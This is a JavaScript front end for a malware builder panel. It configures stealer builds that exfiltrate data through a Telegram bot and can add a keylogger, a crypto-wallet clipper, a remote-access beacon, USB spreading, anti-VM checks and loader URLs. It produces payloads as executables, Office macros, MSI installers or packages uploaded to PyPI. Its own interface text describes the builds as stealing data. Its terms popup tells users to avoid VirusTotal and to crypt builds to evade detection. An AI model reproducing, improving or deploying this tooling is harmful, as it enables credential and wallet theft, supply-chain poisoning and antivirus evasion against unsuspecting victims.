const TELEGRAM_API = 'https://api.telegram.org/bot';
var instructions_windows = '';
var instructions_linux = '';

async function run_backup() {
    let data = (await eel.create_backup()());
    downloadFile('backup.zip', data, true);
}

function warnTelegramConfiguration() {
    UIkit.modal.confirm('We will set everything up for you, make sure you have Telegram installed and logged into your account. Sometimes you can get disconnected from your account, so make sure you have access to the phone it\'s registered to.').then(function() {
        beginTelegramConfiguration();
    });
}

// Get telegram accounts from local PC
async function beginTelegramConfiguration(passcode = '') {
    let sessions = (await eel.telegram_sessions(passcode)());
    
    console.log(sessions);
    if (sessions['status']) {
        let account_select = document.getElementById('selected-telegram-account');
        account_select.innerHTML = '';
        for (const [key, value] of Object.entries(sessions['sessions'])) {
            account_select.innerHTML += `<option value="${value}">${key}</option>`;
        }
        UIkit.modal(document.getElementById('automatic-telegram-bot-modal')).show()
    } else {
        notification(sessions['message'], 'ic:baseline-telegram');
        if (sessions['message'].includes('passcode required')) {
            let code = await UIkit.modal.prompt('Provide telegram local passcode to continue');
            if (code != null && code.length > 0) {
                beginTelegramConfiguration(code);
            }
        }
    }
}

// Create telegram bot
async function createNewTelegramBot() {
    let session = document.getElementById('selected-telegram-account').value;
    let response = (await eel.create_telegram_bot(session)());

    if (response['status']) {
        document.getElementById('telegram_token').value = response['token'];
        document.getElementById('telegram_chat_id').value = response['chatid'];
        notification(`Bot @${response['bot_username']} was created`, 'ic:baseline-telegram');
    } else {
        notification(response['message'], 'ic:baseline-telegram');
    }
}

eel.expose(building_progress);
function building_progress(value) {
    setTimeout(() => {
        let percentage = document.getElementById('builder_progress_percentage');
        let progress = document.getElementById('builder_progress');
        progress.value = value;
        percentage.style.left = value / 2 + '%'; // Move text to center of progress.
        percentage.innerText = value + '%';
        if (value >= 100) {
            setTimeout(() => {
                percentage.innerText = '';
                progress.value = 0;
            }, 3000);
        }
    }, 500 + value * 2);
}

function modify_build_button(text, icon) {
    document.getElementById('build-button-icon').setAttribute('icon', icon);
    document.getElementById('build-button-text').innerText = text;
}

function toggleClipper(self) { document.getElementById('clipper_setup').style.display = self.checked ? 'inline' : 'none'; }

function stubSelected(name) {
    let os = name.split('_')[0];
    let extension = name.split('_')[1];

    check_app_installed(extension);
    let win_only = os == 'win' ? 'block' : 'none';
    document.getElementById('encryption_method_label').style.display = win_only;
    document.getElementById('loader_label').style.display = win_only;
    document.getElementById('net_version_label').style.display = win_only;
    document.getElementById('install_method_label').style.display = win_only;
    Array.prototype.forEach.call(document.getElementsByClassName('checkbox'), function(el) {
        el.style.display = os == 'win' ? 'inline' : 'none'
    });
    document.getElementById('pumper_label').style.display = name == 'win_exe' ? 'block' : 'none';
    document.getElementById('signature_select_item').style.display = name == 'win_exe' ? 'block' : 'none';
    document.getElementById('icon_select_item').style.display = name == 'win_exe' ? 'block' : 'none';
    document.getElementById('instructions').value = os == 'win' ? instructions_windows : instructions_linux;
    document.getElementById('instructions').style.display = 'inline';
    // Build button style
    if (name == 'win_pypi') {
        document.getElementById('instructions').style.display = 'none';
        modify_build_button('PyPi upload', 'line-md:upload-loop');
    } else if (extension.includes('doc') || extension.includes('xl')) {
        modify_build_button('Create macro', 'gala:file-document');
    } else {
        modify_build_button('Build', 'vaadin:compile');
    }
    document.querySelectorAll('label[for^=\'pypi\']').forEach((el) => el.style.display = name == 'win_pypi' ? 'block' : 'none');
}

// Toggle build button
function enable_build_button() { document.getElementById('build-button-action').disabled = false; }
function disable_build_button() { document.getElementById('build-button-action').disabled = true; }

// Check if Word / Excel / Wix modules are instaled
async function check_app_installed(extension) {
    let app = '';
    if (extension == 'msi') { app = 'Wix'; }
    if (extension == 'pypi') { app = 'Python'; }
    else if (extension == 'doc' || extension == 'docm') { app = 'Word'; }
    else if (extension == 'xls' || extension == 'xll' || extension == 'xlsm') { app = 'Excel'; }
    else { enable_build_button(); }
    if (app.length > 0) {
        disable_build_button();
        let status = (await eel.is_app_installed(app)());
        if (!status) {
            notification(app + ' installation required!', 'streamline:programming-module-cube-code-module-programming-plugin');
        } else {
            enable_build_button();
        }
    }
}

function iconSelected(icon) {
    if (icon == 'none') { icon = 'app.ico'; }
    document.getElementById('icon_preview').setAttribute('src', `win-icons/${icon}`)
}

async function HTTP_GET(url) 
{
    // Chrome CORS patch
    let response = (await eel.get_request(url)());
    return response;
    // return new Promise(resolve => {
    //     let xmlhttp = new XMLHttpRequest();
    //     xmlhttp.open("GET", url, true);
    //     xmlhttp.onload = resolve;
    //     xmlhttp.send();
    // });
}

async function check_grabber_commands(url) {
    try {
        const response = (await this.HTTP_GET(url));
        return response.startsWith('<?xml') && response.includes('Commands') 
    } catch {
        return false;
    }
}

async function check_token(token) {
    const url = `${TELEGRAM_API}${token}/getMe`;
    const response = JSON.parse((await this.HTTP_GET(url)));
   
    notification(
        response['ok'] ? 'Bot connected @' + response['result']['username'] : 'Error: ' + response['description'], 
        response['ok'] ? 'ic:round-check-circle-outline' : 'mi:circle-error'
    );    
    return response['ok'];
}

async function check_chat_id(token, chatid) {
    const url = `${TELEGRAM_API}${token}/sendMessage?chat_id=${chatid}&text=✅ ${projectName} connected!`;
    const response = JSON.parse((await this.HTTP_GET(url)));
    notification(
        response['ok'] ? 'Message delivered successfully' : 'Error: ' + response['description'], 
        response['ok'] ? 'ic:round-check-circle-outline' : 'mi:circle-error'
    );   
    return response['ok'];
}


async function warningApprooved() {
    if (getCookie('warningApprooved', false) == 'true') {
        return true;
    }
    let content = `
    <ol>
        <li>I will <b>NOT</b> use the program for illegal purposes.</li>
        <li>I will <b>NOT</b> share panel files.</li>
        <li>I will <b>NOT</b> upload build to virustotal and other services.</li>
        <li>Also we recommend to crypt build to prevent future detections of clean stub. Also stub will live longer without being detected.</li>
    </ol>`;
    let response = await UIkit.modal.confirm(content).then(function () {
        setCookie('warningApprooved', true);
        return true;
    }, function () {
        return false;
    });
    
    return response;
}

async function build() {
    // TOS
    if (!await warningApprooved()) {
        notification('Building cancelled', 'mdi:warning')
        return;
    }

    let token_input = document.getElementById('telegram_token').value;
    let chatid_input = document.getElementById('telegram_chat_id').value;
    let tag_input = document.getElementById('build_tag').value.replaceAll(' ', '_');
    let rsa_public = document.getElementById('rsa_public').value;
    let instructions = document.getElementById('instructions').value;
    let extension = document.getElementById('extension').value;
    let net_version = Number(document.getElementById('net_version').value);
    let antivm = document.getElementById('antivm').checked;
    let usbspread = document.getElementById('usbspread').checked;
    let localusersspread = document.getElementById('localuserspread').checked;
    let rand_res = document.getElementById('random_resources').checked;
    let auto_keylogger = document.getElementById('auto_keylogger').checked;
    let clipper_enabled = document.getElementById('clipper').checked;
    //let antirepeat = document.getElementById('antirepeat').checked;
    //let selfdestruct = document.getElementById('selfdestruct').checked;
    let fileIcon = document.getElementById('file-icon').value;
    let fileSignature = document.getElementById('file-signature').value;
    let sizePumper = Number(document.getElementById('pump_bytes').value);
    let loader_urls = document.getElementById('loader_urls').value;
    let encryption_method = document.querySelector('input[name="encryption_method"]:checked').value;
    let install_method = document.querySelector('input[name="install_method"]:checked').value;
    let resident_method = document.getElementById('resident_method').value;

    // Telegram token check
    if (!/[0-9]{9}:[a-zA-Z0-9_-]{35}/.test(token_input)) {
        notification('Invalid telegram bot token specified', 'ic:sharp-vpn-key-off')
        let el = document.getElementById('telegram_token');
        el.focus()
        el.scrollIntoView()
        return;
    }

    // Telegram chatid check
    if (!/^-?\d+$/.test(chatid_input)) {
        notification('Invalid telegram chat id specified', 'ri:chat-off-fill')
        let el = document.getElementById('telegram_chat_id');
        el.focus()
        el.scrollIntoView()
        return;
    }

    // Tag check
    if (/[ `!@#$%^&*()+\-=\[\]{};':"\\|,.<>\/?~]/.test(tag_input)) {
        notification('Please remove special characters from build tag', 'material-symbols:tag')
        let el = document.getElementById('build_tag');
        el.focus()
        el.scrollIntoView()
        return;
    }

    let resident = install_method == 'Resident';
    // Reset settings if non exe selected
    if (extension != 'win_exe') 
    {
         fileIcon = 'none'; 
         fileSignature = 'none';
         sizePumper = 0;
    }

    // Check instructions url
    if (instructions.startsWith('http')) {
        if (!(await check_grabber_commands(instructions))) {
            notification(`Invalid data: ` + instructions, 'bi:filetype-xml');
            return
        }
    }
    additions = {};
    // Pypi build
    if (extension == 'win_pypi') {
        instructions = instructions_windows + '<<<>>>' + instructions_linux;
        additions['(PYPI_LIB_NAME)'] = document.getElementById('pypi_name').value;
        additions['(PYPI_VERSION)'] = document.getElementById('pypi_version').value;
        additions['(PYPI_USERNAME)'] = document.getElementById('pypi_username').value;
        additions['(PYPI_PASSWORD)'] = document.getElementById('pypi_password').value;
    } 
    // Clipper setup
    if (clipper_enabled) {
        let wallets = document.querySelectorAll('input[id^="CLIPPER_"][id$="_WALLET"]');
        for (let w = 0; w < wallets.length; w++) 
        { 
            additions['[' + wallets[w].id + ']'] = wallets[w].value;
            console.log(`Inject ${wallets[w].id} = ${wallets[w].value}`)
        } 
    }
    
    if (await check_token(token_input)) {
        if (await check_chat_id(token_input, chatid_input)) {
            let build_result = (await eel.generate_build(Object.assign( {}, {
                "[TOKEN]": token_input,
                "[CHATID]": chatid_input,
                "[COMMANDS]": instructions.replaceAll('\n', '').replaceAll('        ', '').replaceAll('      ', '').replaceAll('    ', ''),
                "[RSA_PUB]": encryption_method == 'RSA+RC4' ? rsa_public : '',
                "[TAG]": tag_input,
                "[ANTIVM]": antivm ? "1": "0",
                "[USB_SPREAD]": usbspread ? "1": "0",
                "[LOCAL_USERS_SPREAD]": localusersspread ? "1": "0",
                "[LOADER]": loader_urls.replaceAll(' ', ''),
                "[BEACON]": resident ? "1" : "0",
                "[BEACON_METHOD]" : resident_method,
                "[AUTO_KEYLOGGER]": auto_keylogger ? "1" : "0",
                "[CLIPPER_ENABLED]": clipper_enabled ? "1" : "0",
                "[DATA_DIR]": Math.random().toString(36).substr(2, 10),
                "[MUTEX]": Math.random().toString(36).substr(2, 10),
            }, additions), net_version, extension, antivm, false, false, rand_res, fileIcon, fileSignature, sizePumper)());
            
            if (build_result['type'] == 'file') {
                let fileExt = sizePumper > 0 ? 'zip' : extension.split('_')[1];
                downloadFile('build.' + fileExt, build_result['file'], true);
            } else if (build_result['type'] == 'text') {

                if (extension == 'win_pypi') {
                    let url = build_result['text'].match(/https:\/\/pypi.org\/project\/(.*)\//g);
                    if (url != null) {
                        UIkit.modal.alert('PyPi url :: ' + url);
                        return;
                    }
                }
                UIkit.modal.alert(build_result['text'].replaceAll('\n', '<br>')); 
            }
            
        }
    }
}

function reveal_rsa_public_key() { document.getElementById('rsa_public').parentElement.style.display = 'block'; }

function install_method_changed(method) {
    let resident_method = document.getElementById('resident_method_label');
    let auto_keylogger = document.getElementById('auto_keylogger_label');
    let clipper = document.getElementById('clipper_label');
    let description = document.getElementById('install_method_description');
    let non_resident = 'Steal data and self-destruct.';
    let resident = 'Steal data and install beacon for remote access later.';
    if (method.value == 'Non-resident') {
        description.innerText = non_resident;
        clipper.style.display = 'none';
        auto_keylogger.style.display = 'none';
        resident_method.style.display = 'none';
    } else if (method.value == 'Resident') {
        description.innerText = resident;
        clipper.style.display = 'inline';
        auto_keylogger.style.display = 'inline';
        resident_method.style.display = 'inline';
    }
}



function encryption_method_changed(algo) {
    let description = document.getElementById('encryption_method_description');
    let rsa_rc4_description = 'Log can be decrypted only by your panel.';
    let rc4_description = 'Log can be decrypted by anyone who has panel.';
    if (algo.value == 'RC4') {
        description.style.color = '#df205a';
        description.innerText = rc4_description;
        notification('This algorithm is insecure!', 'material-symbols:security', 5000);
    } else if (algo.value == 'RSA+RC4') {
        description.style.color = '';
        description.innerText = rsa_rc4_description;
    }
}

async function fetchConfigs() {
    let c = (await eel.get_configs()());
    instructions_linux = c[2];
    instructions_windows = c[1];
    document.getElementById('instructions').value = c[1];
    document.getElementById('rsa_public').value = c[0];
    document.getElementById('telegram_token').value = c[3]['token'];
    document.getElementById('telegram_chat_id').value = c[3]['chatid'];
    document.getElementById('build_tag').value = c[3]['tag'];
    // Load icons into icon select
    let icon_select = document.getElementById('file-icon');
    for (let i = 0; i < c[4].length; i++) {
        if (c[4][i] != 'app.ico') {
            let opt = document.createElement('option');
            opt.value = c[4][i];
            opt.innerHTML = c[4][i].split('.')[0].toUpperCase();
            icon_select.appendChild(opt);
        }
    }
    // Load signatures
    let file_signature = document.getElementById('file-signature');
    for (let i = 0; i < c[5].length; i++) {
        let opt = document.createElement('option');
        opt.value = c[5][i];
        opt.innerHTML = c[5][i].split('.')[0];
        file_signature.appendChild(opt);
    }
}

window.addEventListener('load', (e) => {
    fetchConfigs();
});